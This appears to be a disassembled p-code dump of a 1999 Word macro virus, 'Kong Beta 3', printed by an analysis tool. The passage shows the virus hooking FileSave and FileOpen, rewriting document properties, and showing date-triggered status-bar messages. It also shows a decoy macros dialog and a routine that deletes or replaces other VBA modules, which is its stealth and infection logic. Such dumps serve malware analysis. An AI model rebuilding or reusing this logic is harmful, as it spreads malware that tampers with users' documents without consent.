' 	LitDI2 0x019A 
' 	LitDI2 0x009B 
' 	ArgsLd ComboBox1__$ 0x0000 
' 	LitStr 0x0009 "ComboBox1"
' 	Ld WordBasic 
' 	ArgsMemCall ListBox 0x0006 
' Line #88:
' 	LitDI2 0x0009 
' 	LitDI2 0x0006 
' 	LitDI2 0x005D 
' 	LitDI2 0x000D 
' 	LitStr 0x000C "&Macro Name:"
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #89:
' 	LitDI2 0x0009 
' 	LitDI2 0x00CD 
' 	LitDI2 0x004B 
' 	LitDI2 0x000D 
' 	LitStr 0x000B "M&acros In:"
' 	LitStr 0x0005 "Text2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #90:
' 	LitDI2 0x0009 
' 	LitDI2 0x00E6 
' 	LitDI2 0x006D 
' 	LitDI2 0x000D 
' 	LitStr 0x000D "Descr&iption:"
' 	LitStr 0x0005 "Text3"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #91:
' 	LitDI2 0x0009 
' 	LitDI2 0x00F5 
' 	LitDI2 0x01A5 
' 	LitDI2 0x0023 
' 	LitStr 0x0005 "Kong$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #92:
' 	LitDI2 0x0055 
' 	LitDI2 0x00CC 
' 	LitDI2 0x0157 
' 	LitDI2 0x003C 
' 	ArgsLd DropListBox2__$ 0x0000 
' 	LitStr 0x0008 "ListBox2"
' 	Ld WordBasic 
' 	ArgsMemCall DropListBox 0x0006 
' Line #93:
' 	LitDI2 0x01BD 
' 	LitDI2 0x00CD 
' 	LitDI2 0x0096 
' 	LitDI2 0x000D 
' 	LitStr 0x0012 "__________________"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #94:
' 	LitDI2 0x01BD 
' 	LitDI2 0x00DC 
' 	LitDI2 0x0096 
' 	LitDI2 0x000D 
' 	LitStr 0x000E "    Copyright "
' 	LitDI2 0x00A9 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " 1999"
' 	Concat 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #95:
' 	LitDI2 0x01BD 
' 	LitDI2 0x00E9 
' 	LitDI2 0x0096 
' 	LitDI2 0x000D 
' 	LitStr 0x0016 "Design by King of Kong"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #96:
' 	LitDI2 0x01BD 
' 	LitDI2 0x00F6 
' 	LitDI2 0x0096 
' 	LitDI2 0x000D 
' 	LitStr 0x0016 "        Planet Elektro"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #97:
' 	LitDI2 0x01BD 
' 	LitDI2 0x0104 
' 	LitDI2 0x0096 
' 	LitDI2 0x000D 
' 	LitStr 0x0016 "Universitas Bung Hatta"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #98:
' 	LitDI2 0x01BD 
' 	LitDI2 0x010F 
' 	LitDI2 0x0096 
' 	LitDI2 0x000D 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #99:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #100:
' Line #101:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #102:
' 	Let 
' 	LitDI2 0x0000 
' 	ArgsLd ComboBox1__$ 0x0001 
' 	Ld dlg 
' 	MemSt Kong2$ 
' Line #103:
' 	Let 
' 	LitStr 0x001D "Macro created 18/07/99 by K&K"
' 	Ld dlg 
' 	MemSt Kong$ 
' Line #104:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St X 
' Line #105:
' 	Ld X 
' 	SelectCase 
' Line #106:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #107:
' 	Ld WordBasic 
' 	ArgsMemCall Cancel 0x0000 
' Line #108:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #109:
' 	ArgsCall Tampil 0x0000 
' Line #110:
' 	GoTo Ulang 
' Line #111:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #112:
' 	ArgsCall EditProperties 0x0000 
' Line #113:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #114:
' 	Ld msoAnimationListensToComputer 
' 	MemStWith Animation 
' Line #115:
' 	LitStr 0x0019 "What would you like to do"
' 	MemStWith Heading 
' Line #116:
' 	LitStr 0x0011 "Shhht............"
' 	MemStWith Then 
' Line #117:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #118:
' 	ArgsMemCallWith Show 0x0000 
' Line #119:
' 	EndWith 
' Line #120:
' 	GoTo Ulang 
' Line #121:
' 	GoTo Ulang 
' Line #122:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #123:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #124:
' 	Ld msoAnimationThinking 
' 	MemStWith Animation 
' Line #125:
' 	LitStr 0x0019 "What would you like to do"
' 	MemStWith Heading 
' Line #126:
' 	LitStr 0x001A "I don't know what you mean"
' 	MemStWith Then 
' Line #127:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #128:
' 	ArgsMemCallWith Show 0x0000 
' Line #129:
' 	EndWith 
' Line #130:
' 	GoTo Ulang 
' Line #131:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #132:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #133:
' 	Ld msoAnimationSearching 
' 	MemStWith Animation 
' Line #134:
' 	LitStr 0x0019 "What would you like to do"
' 	MemStWith Heading 
' Line #135:
' 	LitStr 0x001B "Sorry buddy, I can help You"
' 	MemStWith Then 
' Line #136:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #137:
' 	ArgsMemCallWith Show 0x0000 
' Line #138:
' 	EndWith 
' Line #139:
' 	GoTo Ulang 
' Line #140:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #141:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #142:
' 	Ld msoAnimationEmptyTrash 
' 	MemStWith Animation 
' Line #143:
' 	LitStr 0x0019 "What would you like to do"
' 	MemStWith Heading 
' Line #144:
' 	LitStr 0x000E "Are you sure ?"
' 	MemStWith Then 
' Line #145:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #146:
' 	ArgsMemCallWith Show 0x0000 
' Line #147:
' 	EndWith 
' Line #148:
' 	GoTo Ulang 
' Line #149:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #150:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #151:
' 	Ld msoAnimationCheckingSomething 
' 	MemStWith Animation 
' Line #152:
' 	LitStr 0x0019 "What would you like to do"
' 	MemStWith Heading 
' Line #153:
' 	LitStr 0x0014 "Organizer ? ........"
' 	MemStWith Then 
' Line #154:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #155:
' 	ArgsMemCallWith Show 0x0000 
' Line #156:
' 	EndWith 
' Line #157:
' 	GoTo Ulang 
' Line #158:
' 	EndSelect 
' Line #159:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub FileSave())
' Line #162:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #163:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #164:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #165:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #166:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #167:
' Line #168:
' 	OnError (Resume Next) 
' Line #169:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #170:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #171:
' 	ArgsCall TularFile 0x0000 
' Line #172:
' 	ArgsCall EditProperties 0x0000 
' Line #173:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #174:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #176:
' 	EndSub 
' Line #177:
' 	FuncDefn (Sub Tampil())
' Line #178:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #179:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #180:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #181:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #182:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #183:
' 	QuoteRem 0x0000 0x0033 " Walaupun harus bekerja keras yang penting suskes!!"
' Line #184:
' 	QuoteRem 0x0000 0x0035 " Dibuat Hari Senin, 28 Juni 1999 selesai 29 Juni 1999"
' Line #185:
' Line #186:
' 	Dim 
' 	VarDefn Spasi
' 	VarDefn MyName
' Line #187:
' 	Dim 
' 	VarDefn King
' 	VarDefn Kong
' 	VarDefn Ulang
' 	VarDefn Waktu
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #188:
' 	Dim 
' 	VarDefn Hitung
' 	VarDefn Hitungi
' 	VarDefn Tanggal
' 	VarDefn Bulan
' Line #189:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0009 
' 	VarDefn Data
' 	VarDefn MyValue
' Line #190:
' 	OnError (Resume Next) 
' Line #191:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #192:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St Tanggal 
' Line #193:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	St Bulan 
' Line #194:
' 	Ld Tanggal 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #195:
' 	LitDI2 0x0008 
' 	St MyValue 
' 	QuoteRem 0x0014 0x000E " Spesial Value"
' Line #196:
' 	LitStr 0x0006 "Symbol"
' 	St JenisHuruf 
' Line #197:
' 	LitDI2 0x0006 
' 	St Warna 
' Line #198:
' 	LitDI2 0x0005 
' 	St Warna2 
' Line #199:
' 	LitDI2 0x0002 
' 	St Warna3 
' Line #200:
' 	LitDI2 0x0003 
' 	St AnimasiHuruf 
' Line #201:
' 	LitStr 0x0001 "i"
' 	St Huruf 
' Line #202:
' 	LitStr 0x0001 "o"
' 	St Huruf2 
' Line #203:
' 	LitStr 0x0001 "u"
' 	St Huruf3 
' Line #204:
' 	LitStr 0x0001 "i"
' 	St HurufBaru 
' Line #205:
' 	LitStr 0x0001 "©"
' 	St HurufBaru2 
' Line #206:
' 	LitStr 0x0001 "u"
' 	St HurufBaru3 
' Line #207:
' 	LitDI2 0x0014 
' 	St Ukuran 
' Line #208:
' 	Ld JenisHuruf 
' 	Ld Warna 
' 	Ld AnimasiHuruf 
' 	Ld Huruf 
' 	Ld HurufBaru 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #209:
' 	Ld JenisHuruf 
' 	Ld Warna2 
' 	Ld AnimasiHuruf 
' 	Ld Huruf2 
' 	Ld HurufBaru2 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #210:
' 	Ld JenisHuruf 
' 	Ld Warna3 
' 	Ld AnimasiHuruf 
' 	Ld Huruf3 
' 	Ld HurufBaru3 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #211:
' 	Ld Tanggal 
' 	LitDI2 0x0010 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #212:
' 	LitDI2 0x0009 
' 	St MyValue 
' Line #213:
' 	LitStr 0x0006 "Symbol"
' 	St JenisHuruf 
' Line #214:
' 	LitDI2 0x0000 
' 	St Warna 
' Line #215:
' 	LitDI2 0x0000 
' 	St AnimasiHuruf 
' Line #216:
' 	LitStr 0x0001 "a"
' 	St Huruf 
' Line #217:
' 	LitStr 0x0001 "c"
' 	St Huruf2 
' Line #218:
' 	LitStr 0x0001 "r"
' 	St Huruf3 
' Line #219:
' 	LitStr 0x0001 "@"
' 	St HurufBaru 
' Line #220:
' 	LitStr 0x0001 "©"
' 	St HurufBaru2 
' Line #221:
' 	LitStr 0x0001 "®"
' 	St HurufBaru3 
' Line #222:
' 	LitDI2 0x0000 
' 	St Ukuran 
' Line #223:
' 	Ld JenisHuruf 
' 	Ld Warna 
' 	Ld AnimasiHuruf 
' 	Ld Huruf 
' 	Ld HurufBaru 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #224:
' 	Ld JenisHuruf 
' 	Ld Warna 
' 	Ld AnimasiHuruf 
' 	Ld Huruf2 
' 	Ld HurufBaru2 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #225:
' 	Ld JenisHuruf 
' 	Ld Warna 
' 	Ld AnimasiHuruf 
' 	Ld Huruf3 
' 	Ld HurufBaru3 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #226:
' 	Ld Tanggal 
' 	LitDI2 0x001D 
' 	Eq 
' 	Ld Bulan 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #227:
' 	LitDI2 0x0000 
' 	St MyValue 
' Line #228:
' 	LitStr 0x0006 "Symbol"
' 	St JenisHuruf 
' Line #229:
' 	LitDI2 0x0006 
' 	St Warna 
' Line #230:
' 	LitDI2 0x0005 
' 	St Warna2 
' Line #231:
' 	LitDI2 0x0002 
' 	St Warna3 
' Line #232:
' 	LitDI2 0x0003 
' 	St AnimasiHuruf 
' Line #233:
' 	LitStr 0x0001 "k"
' 	St Huruf 
' Line #234:
' 	LitStr 0x0001 "o"
' 	St Huruf2 
' Line #235:
' 	LitStr 0x0001 "l"
' 	St Huruf3 
' Line #236:
' 	LitStr 0x0001 "u"
' 	St Huruf4 
' Line #237:
' 	LitStr 0x0001 "k"
' 	St HurufBaru 
' Line #238:
' 	LitStr 0x0001 "o"
' 	St HurufBaru2 
' Line #239:
' 	LitStr 0x0001 "©"
' 	St HurufBaru3 
' Line #240:
' 	LitStr 0x0001 "u"
' 	St HurufBaru4 
' Line #241:
' 	LitDI2 0x0014 
' 	St Ukuran 
' Line #242:
' 	Ld JenisHuruf 
' 	Ld Warna 
' 	Ld AnimasiHuruf 
' 	Ld Huruf 
' 	Ld HurufBaru 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #243:
' 	Ld JenisHuruf 
' 	Ld Warna 
' 	Ld AnimasiHuruf 
' 	Ld Huruf2 
' 	Ld HurufBaru2 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #244:
' 	Ld JenisHuruf 
' 	Ld Warna2 
' 	Ld AnimasiHuruf 
' 	Ld Huruf3 
' 	Ld HurufBaru3 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #245:
' 	Ld JenisHuruf 
' 	Ld Warna3 
' 	Ld AnimasiHuruf 
' 	Ld Huruf4 
' 	Ld HurufBaru4 
' 	Ld Ukuran 
' 	Ld Tanggal 
' 	ArgsCall Animasi 0x0007 
' Line #246:
' 	ElseBlock 
' Line #247:
' 	ArgsCall Read 0x0000 
' Line #248:
' 	LitDI2 0x0007 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St MyValue 
' Line #249:
' 	EndIfBlock 
' Line #250:
' 	LitStr 0x008C "                                                                                                                                            "
' 	St Spasi$ 
' Line #251:
' 	LitStr 0x0014 "Long Live The Master"
' 	LitDI2 0x0000 
' 	ArgsSt Data$ 0x0001 
' Line #252:
' 	LitStr 0x0027 "Planet Elektro - Universitas Bung Hatta"
' 	LitDI2 0x0001 
' 	ArgsSt Data$ 0x0001 
' Line #253:
' 	LitStr 0x003C "I'm a poor lonesome CowBoy and a long long way from home...."
' 	LitDI2 0x0002 
' 	ArgsSt Data$ 0x0001 
' Line #254:
' 	LitStr 0x0038 "I'm a poor lonesome CowBoy and a long long way from Inel"
' 	LitDI2 0x0003 
' 	ArgsSt Data$ 0x0001 
' Line #255:
' 	LitStr 0x0016 "The Truth Is Out There"
' 	LitDI2 0x0004 
' 	ArgsSt Data$ 0x0001 
' Line #256:
' 	LitStr 0x0017 "Kong Beta 3, Copyright "
' 	LitDI2 0x00A9 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B " 1999, K&K Software Design "
' 	Concat 
' 	LitDI2 0x0099 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt Data$ 0x0001 
' Line #257:
' 	LitStr 0x002D "Untuk Satri RX. yang ingin namanya dimasukkan"
' 	LitDI2 0x0006 
' 	ArgsSt Data$ 0x0001 
' Line #258:
' 	LitStr 0x0035 "Untuk RNI, DonnYA, DNV mudah-mudahan sampai ke rumah!"
' 	LitDI2 0x0007 
' 	ArgsSt Data$ 0x0001 
' Line #259:
' 	LitStr 0x0060 "Happy birthday to you...Happy birthday to you...Happy birthday dear Inel...Happy birthday to you"
' 	LitDI2 0x0008 
' 	ArgsSt Data$ 0x0001 
' Line #260:
' 	LitStr 0x005F "Happy birthday to you...Happy birthday to you...Happy birthday dear Yen...Happy birthday to you"
' 	LitDI2 0x0009 
' 	ArgsSt Data$ 0x0001 
' Line #261:
' 	Ld MyValue 
' 	ArgsLd Data$ 0x0001 
' 	Ld Spasi$ 
' 	Ld Spasi$ 
' 	FnLen 
' 	Ld MyValue 
' 	ArgsLd Data$ 0x0001 
' 	FnLen 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Add 
' 	Ld MyValue 
' 	ArgsLd Data$ 0x0001 
' 	Add 
' 	St DataAkhir$ 
' Line #262:
' 	LitStr 0x000A "Copyright "
' 	LitDI2 0x00A9 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F " 1999 K&K Software Design, Inc."
' 	Concat 
' 	St My$ 
' Line #263:
' 	LitDI4 0x1170 0x0001 
' 	St Waktu 
' 	QuoteRem 0x0013 0x001E "Mudah - mudahan nggak kelamaan"
' Line #264:
' 	Ld MyValue 
' 	ArgsLd Data$ 0x0001 
' 	FnLen 
' 	St Kong 
' Line #265:
' 	StartForVariable 
' 	Ld Hitung 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld DataAkhir$ 
' 	FnLen 
' 	LitDI2 0x008B 
' 	Add 
' 	Paren 
' 	For 
' Line #266:
' 	Ld Kong 
' 	Ld DataAkhir$ 
' 	FnLen 
' 	Ge 
' 	IfBlock 
' Line #267:
' 	Ld MyValue 
' 	ArgsLd Data$ 0x0001 
' 	FnLen 
' 	St Kong 
' Line #268:
' 	Ld DataAkhir$ 
' 	FnLen 
' 	St Hitung 
' Line #269:
' 	EndIfBlock 
' Line #270:
' Line #271:
' 	Ld Hitung 
' 	Ld DataAkhir$ 
' 	FnLen 
' 	Ge 
' 	IfBlock 
' Line #272:
' 	Ld Kong 
' 	LitDI2 0x0001 
' 	Add 
' 	St Kong 
' Line #273:
' 	Ld DataAkhir$ 
' 	Ld Kong 
' 	ArgsLd Right$ 0x0002 
' 	Ld Spasi$ 
' 	Ld Spasi$ 
' 	FnLen 
' 	Ld MyValue 
' 	ArgsLd Data$ 0x0001 
' 	FnLen 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	Add 
' 	St MyName$ 
' Line #274:
' 	Ld MyName$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #275:
' 	Ld Waktu 
' 	Paren 
' 	ArgsCall Tunggu 0x0001 
' Line #276:
' 	Ld Hitung 
' 	Ld DataAkhir$ 
' 	FnLen 
' 	Lt 
' 	ElseIfBlock 
' Line #277:
' 	Ld DataAkhir$ 
' 	Ld Hitung 
' 	ArgsLd Right$ 0x0002 
' 	St MyName$ 
' Line #278:
' 	Ld MyName$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #279:
' 	Ld Waktu 
' 	Paren 
' 	ArgsCall Tunggu 0x0001 
' Line #280:
' 	EndIfBlock 
' Line #281:
' 	StartForVariable 
' 	Ld Hitung 
' 	EndForVariable 
' 	NextVar 
' Line #282:
' Line #283:
' 	LitDI2 0x000A 
' 	Ld Waktu 
' 	Mul 
' 	Paren 
' 	ArgsCall Tunggu 0x0001 
' Line #284:
' 	StartForVariable 
' 	Ld Ulang 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #285:
' 	LitDI2 0x0000 
' 	St King 
' Line #286:
' 	Ld DataAkhir$ 
' 	St MyName$ 
' Line #287:
' 	StartForVariable 
' 	Ld Hitungi 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld DataAkhir$ 
' 	FnLen 
' 	Ld MyValue 
' 	ArgsLd Data$ 0x0001 
' 	FnLen 
' 	Sub 
' 	Paren 
' 	For 
' Line #288:
' 	Ld DataAkhir$ 
' 	Ld DataAkhir$ 
' 	FnLen 
' 	Ld King 
' 	Sub 
' 	Paren 
' 	ArgsLd Right$ 0x0002 
' 	St MyName$ 
' Line #289:
' 	Ld MyName$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #290:
' 	Ld Waktu 
' 	Paren 
' 	ArgsCall Tunggu 0x0001 
' Line #291:
' 	Ld King 
' 	LitDI2 0x0001 
' 	Add 
' 	St King 
' Line #292:
' 	StartForVariable 
' 	Ld Hitungi 
' 	EndForVariable 
' 	NextVar 
' Line #293:
' 	StartForVariable 
' 	Ld Ulang 
' 	EndForVariable 
' 	NextVar 
' Line #294:
' 	LitDI2 0x0032 
' 	Ld Waktu 
' 	Mul 
' 	Paren 
' 	ArgsCall Tunggu 0x0001 
' Line #295:
' 	Ld My$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #296:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #297:
' 	EndSub 
' Line #298:
' 	FuncDefn (Private Sub Tunggu(Waktu))
' Line #299:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #300:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #301:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #302:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #303:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #304:
' 	QuoteRem 0x0000 0x002D " Sorry Tung, dari semua bagian dari macro ini"
' Line #305:
' 	QuoteRem 0x0000 0x0024 " Ente yang harus paling banyak kerja"
' Line #306:
' Line #307:
' 	StartForVariable 
' 	Ld Hitungan 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Waktu 
' 	For 
' Line #308:
' 	Rem 0x0016 " Harap tunggu sebentar"
' Line #309:
' 	StartForVariable 
' 	Ld Hitungan 
' 	EndForVariable 
' 	NextVar 
' Line #310:
' 	EndSub 
' Line #311:
' 	FuncDefn (Sub FormatStyle())
' Line #312:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #313:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #314:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #315:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #316:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #317:
' Line #318:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #319:
' 	EndSub 
' Line #320:
' 	FuncDefn (Function EditProperties())
' Line #321:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #322:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #323:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #324:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #325:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #326:
' Line #327:
' 	OnError (Resume Next) 
' Line #328:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #329:
' 	LitStr 0x0016 "The Truth Is Out There"
' 	LitDI2 0x0001 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #330:
' 	LitStr 0x000E "Kong's Project"
' 	LitDI2 0x0002 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #331:
' 	LitStr 0x000C "King of Kong"
' 	LitDI2 0x0003 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #332:
' 	LitStr 0x000E "Planet Elektro"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "Universitas Bung Hatta - Padang"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "Sumatera Barat - Indonesia"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001F "Terima kasih atas kerja samanya"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsMemStWith BuiltInDocumentProperties 0x0001 
' Line #333:
' 	EndWith 
' Line #334:
' 	EndFunc 
' Line #335:
' 	FuncDefn (Sub Periksa(KFile))
' Line #336:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #337:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #338:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #339:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #340:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #341:
' Line #342:
' 	OnError (Resume Next) 
' Line #343:
' 	StartForVariable 
' 	Ld Item 
' 	EndForVariable 
' 	Ld KFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #344:
' 	LitDI2 0x0001 
' 	Ld KFile 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ThisDocu 
' Line #345:
' 	LitDI2 0x0001 
' 	Ld KFile 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St JumThisDocu 
' Line #346:
' 	Ld Item 
' 	MemLd New 
' 	Ld ThisDocu 
' 	Eq 
' 	IfBlock 
' Line #347:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld KFile 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld KFile 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #348:
' 	Ld Item 
' 	MemLd New 
' 	LitStr 0x0006 "MsKong"
' 	Ne 
' 	ElseIfBlock 
' Line #349:
' 	Ld KFile 
' 	MemLd FullName 
' 	Ld Item 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #350:
' 	EndIfBlock 
' Line #351:
' 	StartForVariable 
' 	Ld Item 
' 	EndForVariable 
' 	NextVar 
' Line #352:
' 	EndSub 
' Line #353:
' 	FuncDefn (Sub FileOpen())
' Line #354:
' 	QuoteRem 0x0000 0x002D "*********************************************"
' Line #355:
' 	QuoteRem 0x0000 0x000C " Kong Beta 3"
' Line #356:
' 	QuoteRem 0x0000 0x002C " Copyright © 1999, K&K Software Design, Inc."
' Line #357:
' 	QuoteRem 0x0000 0x000F " The Pariamaner"
' Line #358:
' 	QuoteRem 0x0000 0x002D " ********************************************"
' Line #359:
